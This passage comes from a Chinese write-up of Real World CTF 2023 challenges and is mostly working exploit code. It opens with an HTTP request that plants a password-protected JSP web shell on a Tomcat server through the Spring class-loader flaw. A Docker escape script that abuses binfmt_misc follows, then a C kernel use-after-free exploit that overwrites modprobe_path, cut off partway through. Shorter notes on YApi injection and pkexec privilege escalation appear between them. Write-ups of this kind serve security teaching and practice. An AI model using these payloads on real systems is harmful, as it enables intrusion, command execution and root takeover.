+</span></span><span class=line><span class=cl>Host: 47.98.216.107:35061
+</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:108.0) Gecko/20100101 Firefox/108.0
+</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
+</span></span><span class=line><span class=cl>Connection: close
+</span></span><span class=line><span class=cl>suffix: %&gt;//
+</span></span><span class=line><span class=cl>c1: Runtime
+</span></span><span class=line><span class=cl>c2: &lt;%
+</span></span><span class=line><span class=cl>DNT: 1
+</span></span><span class=line><span class=cl>Content-Type: application/x-www-form-urlencoded
+</span></span><span class=line><span class=cl>Content-Length: 766
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&amp;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;class.module.classLoader.resources.context.parent.pipeline.first.directory=chaitin/susu&amp;class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&amp;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
+</span></span></code></pre></td></tr></table></div></div><p>webapps名称换成了chaitin，把webapps改掉就可以直接打</p><h2 id=evil-mysql-server>Evil MySQL Server</h2><p>MySQL服务端读取客户端文件漏洞
+<img src=/img/2023-01-10-RWCTF/4.png alt></p><h2 id=yummy-api>Yummy Api</h2><p>YApi NoSQL注入导致远程命令执行漏洞
+<img src=/img/2023-01-10-RWCTF/5.png alt></p><h2 id=be-a-famicom-hacker>Be-a-Famicom-Hacker</h2><p><code>https://tieba.baidu.com/p/20384367?pn=1</code>
+<img src=/img/2023-01-10-RWCTF/6.png alt>
+玩游戏通关到最后按这两个键出flag</p><p><img src=/img/2023-01-10-RWCTF/7.png alt>
+上上下下左右左右ba</p><h2 id=be-a-pk-lpe-master>Be-a-PK-LPE-Master</h2><p>用户名: ubuntu 密码: root</p><p>ubuntu用户在sudo组里，sudo -i获取root shell</p><p>当然正解是利用pkexec提权，github上有很多直接可以利用</p><p>用户名和密码都是猜的，题目描述啥也没说，不是很懂这一题</p><h2 id=be-a-docker-escaper-2>Be-a-Docker-Escaper-2</h2><p>挂载了/proc/sys/fs/binfmt_misc，那么就可以通过注册新的解释器来逃逸</p><p>注册#!/bin/sh的解释器，然后再开启一个ssh链接就可以完成逃逸</p><p>参考链接: <a href=http://paper.vulsee.com/KCon/2021/Container%20escape%20in%202021.pdf>http://paper.vulsee.com/KCon/2021/Container%20escape%20in%202021.pdf</a></p><p>EXP:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/bin/bash</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>path</span><span class=o>=</span><span class=err>$</span><span class=p>(</span><span class=n>mount</span> <span class=o>|</span> <span class=n>grep</span> <span class=n>upperdir</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>path</span><span class=o>=</span><span class=err>$</span><span class=p>{</span><span class=n>path</span><span class=c1>##*upperdir=}</span>
+</span></span><span class=line><span class=cl><span class=n>path</span><span class=o>=</span><span class=err>$</span><span class=p>{</span><span class=n>path</span><span class=o>%%</span><span class=p>,</span><span class=o>*</span><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>echo</span> <span class=s1>&#39;#!/bin/bash&#39;</span> <span class=o>&gt;</span> <span class=o>/</span><span class=n>tmp</span><span class=o>/</span><span class=n>test</span><span class=o>.</span><span class=n>sh</span>
+</span></span><span class=line><span class=cl><span class=n>echo</span> <span class=s1>&#39;&#39;</span> <span class=o>&gt;&gt;</span> <span class=o>/</span><span class=n>tmp</span><span class=o>/</span><span class=n>test</span><span class=o>.</span><span class=n>sh</span>
+</span></span><span class=line><span class=cl><span class=n>echo</span> <span class=s1>&#39;cat /root/flag &gt; &#39;</span><span class=err>$</span><span class=n>path</span><span class=s1>&#39;/tmp/flag&#39;</span> <span class=o>&gt;&gt;</span> <span class=o>/</span><span class=n>tmp</span><span class=o>/</span><span class=n>test</span><span class=o>.</span><span class=n>sh</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>chmod</span> <span class=n>a</span><span class=o>+</span><span class=n>x</span> <span class=o>/</span><span class=n>tmp</span><span class=o>/</span><span class=n>test</span><span class=o>.</span><span class=n>sh</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>echo</span> <span class=s1>&#39;:sh:M::</span><span class=se>\x23\x21\x2f\x62\x69\x6e\x2f\x73\x68</span><span class=s1>::&#39;</span><span class=err>$</span><span class=n>path</span><span class=s1>&#39;/tmp/test.sh:&#39;</span> <span class=o>&gt;</span> <span class=o>/</span><span class=n>binfmt_misc</span><span class=o>/</span><span class=n>register</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=digging-into-kernel-3>Digging into Kernel 3</h2><p>一个任意size的uaf，不限制uaf的次数，并且没有打开slab_freelist_hardened</p><p>既然没有打开slab_freelist_hardened，那么double_free的任意地址写就是可行的，那么就需要我们泄露kernel地址</p><p>显然题目中没有给任何泄露手段，那么就需要struct msg来进行泄露</p><p>首先制作一个0x20大小的uaf，接着创建一个0x1018大小的struct msg</p><p>此时0x20部分的struct msg会被放入uaf中，将其free，分配一个struct shm_file_data</p><p>此时在输出struct msg就可以成功泄露kernel地址</p><p>特别要注意，由于内核关闭了CONFIG_CHECKPOINT_RESTORE，MSG_COPY无法使用</p><p>并且由于SElinux的开启，struct msg的security指针不能被破坏</p><p>因此进行uaf的结构体的前8个字节必须要为0，目前似乎仅有struct shm_file_data能满足条件</p><p>最后直接double_free写modprobe_path就行</p><p>EXP:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
+</span><span class=lnt>  2
+</span><span class=lnt>  3
+</span><span class=lnt>  4
+</span><span class=lnt>  5
+</span><span class=lnt>  6
+</span><span class=lnt>  7
+</span><span class=lnt>  8
+</span><span class=lnt>  9
+</span><span class=lnt> 10
+</span><span class=lnt> 11
+</span><span class=lnt> 12
+</span><span class=lnt> 13
+</span><span class=lnt> 14
+</span><span class=lnt> 15
+</span><span class=lnt> 16
+</span><span class=lnt> 17
+</span><span class=lnt> 18
+</span><span class=lnt> 19
+</span><span class=lnt> 20
+</span><span class=lnt> 21
+</span><span class=lnt> 22
+</span><span class=lnt> 23
+</span><span class=lnt> 24
+</span><span class=lnt> 25
+</span><span class=lnt> 26
+</span><span class=lnt> 27
+</span><span class=lnt> 28
+</span><span class=lnt> 29
+</span><span class=lnt> 30
+</span><span class=lnt> 31
+</span><span class=lnt> 32
+</span><span class=lnt> 33
+</span><span class=lnt> 34
+</span><span class=lnt> 35
+</span><span class=lnt> 36
+</span><span class=lnt> 37
+</span><span class=lnt> 38
+</span><span class=lnt> 39
+</span><span class=lnt> 40
+</span><span class=lnt> 41
+</span><span class=lnt> 42
+</span><span class=lnt> 43
+</span><span class=lnt> 44
+</span><span class=lnt> 45
+</span><span class=lnt> 46
+</span><span class=lnt> 47
+</span><span class=lnt> 48
+</span><span class=lnt> 49
+</span><span class=lnt> 50
+</span><span class=lnt> 51
+</span><span class=lnt> 52
+</span><span class=lnt> 53
+</span><span class=lnt> 54
+</span><span class=lnt> 55
+</span><span class=lnt> 56
+</span><span class=lnt> 57
+</span><span class=lnt> 58
+</span><span class=lnt> 59
+</span><span class=lnt> 60
+</span><span class=lnt> 61
+</span><span class=lnt> 62
+</span><span class=lnt> 63
+</span><span class=lnt> 64
+</span><span class=lnt> 65
+</span><span class=lnt> 66
+</span><span class=lnt> 67
+</span><span class=lnt> 68
+</span><span class=lnt> 69
+</span><span class=lnt> 70
+</span><span class=lnt> 71
+</span><span class=lnt> 72
+</span><span class=lnt> 73
+</span><span class=lnt> 74
+</span><span class=lnt> 75
+</span><span class=lnt> 76
+</span><span class=lnt> 77
+</span><span class=lnt> 78
+</span><span class=lnt> 79
+</span><span class=lnt> 80
+</span><span class=lnt> 81
+</span><span class=lnt> 82
+</span><span class=lnt> 83
+</span><span class=lnt> 84
+</span><span class=lnt> 85
+</span><span class=lnt> 86
+</span><span class=lnt> 87
+</span><span class=lnt> 88
+</span><span class=lnt> 89
+</span><span class=lnt> 90
+</span><span class=lnt> 91
+</span><span class=lnt> 92
+</span><span class=lnt> 93
+</span><span class=lnt> 94
+</span><span class=lnt> 95
+</span><span class=lnt> 96
+</span><span class=lnt> 97
+</span><span class=lnt> 98
+</span><span class=lnt> 99
+</span><span class=lnt>100
+</span><span class=lnt>101
+</span><span class=lnt>102
+</span><span class=lnt>103
+</span><span class=lnt>104
+</span><span class=lnt>105
+</span><span class=lnt>106
+</span><span class=lnt>107
+</span><span class=lnt>108
+</span><span class=lnt>109
+</span><span class=lnt>110
+</span><span class=lnt>111
+</span><span class=lnt>112
+</span><span class=lnt>113
+</span><span class=lnt>114
+</span><span class=lnt>115
+</span><span class=lnt>116
+</span><span class=lnt>117
+</span><span class=lnt>118
+</span><span class=lnt>119
+</span><span class=lnt>120
+</span><span class=lnt>121
+</span><span class=lnt>122
+</span><span class=lnt>123
+</span><span class=lnt>124
+</span><span class=lnt>125
+</span><span class=lnt>126
+</span><span class=lnt>127
+</span><span class=lnt>128
+</span><span class=lnt>129
+</span><span class=lnt>130
+</span><span class=lnt>131
+</span><span class=lnt>132
+</span><span class=lnt>133
+</span><span class=lnt>134
+</span><span class=lnt>135
+</span><span class=lnt>136
+</span><span class=lnt>137
+</span><span class=lnt>138
+</span><span class=lnt>139
+</span><span class=lnt>140
+</span><span class=lnt>141
+</span><span class=lnt>142
+</span><span class=lnt>143
+</span><span class=lnt>144
+</span><span class=lnt>145
+</span><span class=lnt>146
+</span><span class=lnt>147
+</span><span class=lnt>148
+</span><span class=lnt>149
+</span><span class=lnt>150
+</span><span class=lnt>151
+</span><span class=lnt>152
+</span><span class=lnt>153
+</span><span class=lnt>154
+</span><span class=lnt>155
+</span><span class=lnt>156
+</span><span class=lnt>157
+</span><span class=lnt>158
+</span><span class=lnt>159
+</span><span class=lnt>160
+</span><span class=lnt>161
+</span><span class=lnt>162
+</span><span class=lnt>163
+</span><span class=lnt>164
+</span><span class=lnt>165
+</span><span class=lnt>166
+</span><span class=lnt>167
+</span><span class=lnt>168
+</span><span class=lnt>169
+</span><span class=lnt>170
+</span><span class=lnt>171
+</span><span class=lnt>172
+</span><span class=lnt>173
+</span><span class=lnt>174
+</span><span class=lnt>175
+</span><span class=lnt>176
+</span><span class=lnt>177
+</span><span class=lnt>178
+</span><span class=lnt>179
+</span><span class=lnt>180
+</span><span class=lnt>181
+</span><span class=lnt>182
+</span><span class=lnt>183
+</span><span class=lnt>184
+</span><span class=lnt>185
+</span><span class=lnt>186
+</span><span class=lnt>187
+</span><span class=lnt>188
+</span><span class=lnt>189
+</span><span class=lnt>190
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1>#include &lt;stdio.h&gt;</span>
+</span></span><span class=line><span class=cl><span class=c1>#include &lt;fcntl.h&gt;</span>
+</span></span><span class=line><span class=cl><span class=c1>#include &lt;poll.h&gt;</span>
+</span></span><span class=line><span class=cl><span class=c1>#include &lt;stdlib.h&gt;</span>
+</span></span><span class=line><span class=cl><span class=c1>#include &lt;string.h&gt;</span>
+</span></span><span class=line><span class=cl><span class=c1>#include &lt;stdint.h&gt;</span>
+</span></span><span class=line><span class=cl><span class=c1>#include &lt;assert.h&gt;</span>
+</span></span><span class=line><span class=cl><span class=c1>#include &lt;signal.h&gt;</span>
+</span></span><span class=line><span class=cl><span class=c1>#include &lt;unistd.h&gt;</span>
+</span></span><span class=line><span class=cl><span class=c1>#include &lt;syscall.h&gt;</span>
+</span></span><span class=line><span class=cl><span class=c1>#include &lt;pthread.h&gt;</span>
+</span></span><span class=line><span class=cl><span class=c1>#include &lt;linux/sched.h&gt;</span>
+</span></span><span class=line><span class=cl><span class=c1>#include &lt;sys/shm.h&gt;</span>
+</span></span><span class=line><span class=cl><span class=c1>#include &lt;sys/msg.h&gt;</span>
+</span></span><span class=line><span class=cl><span class=c1>#include &lt;sys/ipc.h&gt;</span>
+</span></span><span class=line><span class=cl><span class=c1>#include &lt;sys/ioctl.h&gt;</span>
+</span></span><span class=line><span class=cl><span class=c1>#include &lt;sys/types.h&gt;</span>
+</span></span><span class=line><span class=cl><span class=c1>#include &lt;sys/stat.h&gt;</span>
+</span></span><span class=line><span class=cl><span class=c1>#include &lt;sys/mman.h&gt;</span>
+</span></span><span class=line><span class=cl><span class=c1>#include &lt;sys/socket.h&gt;</span>
+</span></span><span class=line><span class=cl><span class=c1>#include &lt;sys/syscall.h&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>struct</span> <span class=n>request</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>	<span class=n>int32_t</span> <span class=n>idx</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=n>int32_t</span> <span class=n>size</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=n>void</span> <span class=o>*</span><span class=n>ptr</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>};</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nb>int</span> <span class=n>dev_fd</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>uint64_t</span> <span class=n>kernel_base</span><span class=p>,</span> <span class=n>modprobe_path</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>void</span> <span class=n>err</span><span class=p>(</span><span class=n>char</span> <span class=o>*</span><span class=n>error</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=n>error</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=n>exit</span><span class=p>(</span><span class=o>-</span><span class=mi>1</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nb>int</span> <span class=n>make_queue</span><span class=p>(</span><span class=n>key_t</span> <span class=n>key</span><span class=p>,</span><span class=nb>int</span> <span class=n>msgflg</span><span class=p>)</span> 
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>	<span class=nb>int</span> <span class=n>result</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>((</span><span class=n>result</span><span class=o>=</span><span class=n>msgget</span><span class=p>(</span><span class=n>key</span><span class=p>,</span><span class=n>msgflg</span><span class=p>))</span><span class=o>==-</span><span class=mi>1</span><span class=p>)</span> 
+</span></span><span class=line><span class=cl>	<span class=p>{</span>
+</span></span><span class=line><span class=cl>		<span class=n>perror</span><span class=p>(</span><span class=s2>&#34;[X] Msgget Failure&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>		<span class=n>exit</span><span class=p>(</span><span class=o>-</span><span class=mi>1</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=n>result</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>void</span> <span class=n>send_msg</span><span class=p>(</span><span class=nb>int</span> <span class=n>msqid</span><span class=p>,</span><span class=n>void</span> <span class=o>*</span><span class=n>msgp</span><span class=p>,</span><span class=n>size_t</span> <span class=n>msgsz</span><span class=p>,</span><span class=nb>int</span> <span class=n>msgflg</span><span class=p>)</span> 
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=n>msgsnd</span><span class=p>(</span><span class=n>msqid</span><span class=p>,</span><span class=n>msgp</span><span class=p>,</span><span class=n>msgsz</span><span class=p>,</span><span class=n>msgflg</span><span class=p>)</span><span class=o>==-</span><span class=mi>1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>	<span class=p>{</span>
+</span></span><span class=line><span class=cl>		<span class=n>perror</span><span class=p>(</span><span class=s2>&#34;[X] Msgsend Failure&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>		<span class=n>exit</span><span class=p>(</span><span class=o>-</span><span class=mi>1</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span><span class=line><span class=cl>	<span class=k>return</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>ssize_t</span> <span class=n>get_msg</span><span class=p>(</span><span class=nb>int</span> <span class=n>msqid</span><span class=p>,</span><span class=n>void</span> <span class=o>*</span><span class=n>msgp</span><span class=p>,</span><span class=n>size_t</span> <span class=n>msgsz</span><span class=p>,</span><span class=n>long</span> <span class=n>msgtyp</span><span class=p>,</span><span class=nb>int</span> <span class=n>msgflg</span><span class=p>)</span> 
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>	<span class=n>ssize_t</span> <span class=n>result</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=n>result</span><span class=o>=</span><span class=n>msgrcv</span><span class=p>(</span><span class=n>msqid</span><span class=p>,</span><span class=n>msgp</span><span class=p>,</span><span class=n>msgsz</span><span class=p>,</span><span class=n>msgtyp</span><span class=p>,</span><span class=n>msgflg</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=n>result</span><span class=o>&lt;</span><span class=mi>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>	<span class=p>{</span>
+</span></span><span class=line><span class=cl>		<span class=n>perror</span><span class=p>(</span><span class=s2>&#34;[X] Msgrcv Failure&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>		<span class=n>exit</span><span class=p>(</span><span class=o>-</span><span class=mi>1</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=n>result</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>void</span> <span class=n>remove_queue</span><span class=p>(</span><span class=nb>int</span> <span class=n>msqid</span><span class=p>,</span><span class=nb>int</span> <span class=n>cmd</span><span class=p>,</span><span class=n>struct</span> <span class=n>msqid_ds</span> <span class=o>*</span><span class=n>buf</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>((</span><span class=n>msgctl</span><span class=p>(</span><span class=n>msqid</span><span class=p>,</span><span class=n>cmd</span><span class=p>,</span><span class=n>buf</span><span class=p>))</span><span class=o>==-</span><span class=mi>1</span><span class=p>)</span> 
+</span></span><span class=line><span class=cl>	<span class=p>{</span>
+</span></span><span class=line><span class=cl>		<span class=n>perror</span><span class=p>(</span><span class=s2>&#34;[X] Msgctl Failure&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>		<span class=n>exit</span><span class=p>(</span><span class=o>-</span><span class=mi>1</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nb>int</span> <span class=n>shmid_open</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>	<span class=nb>int</span> <span class=n>shmid</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>((</span><span class=n>shmid</span><span class=o>=</span><span class=n>shmget</span><span class=p>(</span><span class=n>IPC_PRIVATE</span><span class=p>,</span><span class=mi>100</span><span class=p>,</span><span class=mi>0600</span><span class=p>))</span><span class=o>==-</span><span class=mi>1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>	<span class=p>{</span>
+</span></span><span class=line><span class=cl>		<span class=n>puts</span><span class=p>(</span><span class=s2>&#34;[X] Shmget Error&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>		<span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span><span class=line><span class=cl>	<span class=n>char</span> <span class=o>*</span><span class=n>shmaddr</span><span class=o>=</span><span class=n>shmat</span><span class=p>(</span><span class=n>shmid</span><span class=p>,</span><span class=n>NULL</span><span class=p>,</span><span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=n>shmaddr</span><span class=o>==</span><span class=p>(</span><span class=n>void</span><span class=o>*</span><span class=p>)</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>	<span class=p>{</span>
+</span></span><span class=line><span class=cl>		<span class=n>puts</span><span class=p>(</span><span class=s2>&#34;[X] Shmat Error&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>		<span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=n>shmid</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>void</span> <span class=n>new</span><span class=p>(</span><span class=n>int32_t</span> <span class=n>idx</span><span class=p>,</span> <span class=n>int32_t</span> <span class=n>size</span><span class=p>,</span> <span class=n>void</span> <span class=o>*</span><span class=n>ptr</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>	<span class=n>struct</span> <span class=n>request</span> <span class=n>request_t</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=n>request_t</span><span class=o>.</span><span class=n>idx</span> <span class=o>=</span> <span class=n>idx</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=n>request_t</span><span class=o>.</span><span class=n>size</span> <span class=o>=</span> <span class=n>size</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=n>request_t</span><span class=o>.</span><span class=n>ptr</span> <span class=o>=</span> <span class=n>ptr</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	
+</span></span><span class=line><span class=cl>	<span class=n>ioctl</span><span class=p>(</span><span class=n>dev_fd</span><span class=p>,</span> <span class=mh>0xDEADBEEF</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>request_t</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>void</span> <span class=n>delete</span><span class=p>(</span><span class=n>int32_t</span> <span class=n>idx</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>	<span class=n>struct</span> <span class=n>request</span> <span class=n>request_t</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=n>request_t</span><span class=o>.</span><span class=n>idx</span> <span class=o>=</span> <span class=n>idx</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	
+</span></span><span class=line><span class=cl>	<span class=n>ioctl</span><span class=p>(</span><span class=n>dev_fd</span><span class=p>,</span> <span class=mh>0xC0DECAFE</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>request_t</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>void</span> <span class=n>leak_kernel_base</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>	<span class=n>char</span> <span class=o>*</span><span class=n>buf</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mh>0x2000</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=n>uint64_t</span> <span class=o>*</span><span class=n>recv_msg</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mh>0x2000</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=nb>int</span> <span class=n>qid</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=n>struct</span> <span class=n>msg</span> <span class=o>*</span><span class=n>message</span> <span class=o>=</span> <span class=p>(</span><span class=n>struct</span> <span class=n>msg</span> <span class=o>*</span><span class=p>)</span><span class=n>buf</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=nb>int</span> <span class=n>size</span> <span class=o>=</span> <span class=mh>0x1018</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	
+</span></span><span class=line><span class=cl>	<span class=n>memset</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span> <span class=mh>0x61</span><span class=p>,</span> <span class=mh>0x2000</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	
+</span></span><span class=line><span class=cl>	<span class=n>new</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>,</span> <span class=n>buf</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=n>delete</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	
+</span></span><span class=line><span class=cl>	<span class=n>memset</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span> <span class=mh>0x61</span><span class=p>,</span> <span class=mh>0x2000</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=n>qid</span> <span class=o>=</span> <span class=n>make_queue</span><span class=p>(</span><span class=n>IPC_PRIVATE</span><span class=p>,</span> <span class=mi>0666</span><span class=o>|</span><span class=n>IPC_CREAT</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=n>send_msg</span><span class=p>(</span><span class=n>qid</span><span class=p>,</span> <span class=n>message</span><span class=p>,</span> <span class=n>size</span><span class=o>-</span><span class=mh>0x30</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	
+</span></span><span class=line><span class=cl>	<span class=n>delete</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	
+</span></span><span class=line><span class=cl>	<span class=n>shmid_open</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>	
+</span></span><span class=line><span class=cl>	<span class=n>get_msg</span><span class=p>(</span><span class=n>qid</span><span class=p>,</span> <span class=p>(</span><span class=n>char</span> <span class=o>*</span><span class=p>)</span><span class=n>recv_msg</span><span class=p>,</span> <span class=n>size</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=n>IPC_NOWAIT</span><span class=o>|</span><span class=n>MSG_NOERROR</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	
+</span></span><span class=line><span class=cl>	<span class=n>kernel_base</span> <span class=o>=</span> <span class=n>recv_msg</span><span class=p>[</span><span class=mh>0x1fb</span><span class=p>]</span> <span class=o>-</span> <span class=mh>0x19ac6c0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	
+</span></span><span class=line><span class=cl>	<span class=n>free</span><span class=p>(</span><span class=n>buf</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	<span class=n>free</span><span class=p>(</span><span class=n>recv_msg</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>void</span> <span class=n>arbitrary_write</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>	<span class=n>uint64_t</span> <span class=o>*</span><span class=n>buf</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mh>0x100</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	
+</span></span><span class=line><span class=cl>	<span class=n>memset</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mh>0x100</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	
+</span></span><span class=line><span class=cl>	<span class=n>new</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>,</span> <span class=n>buf</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>	
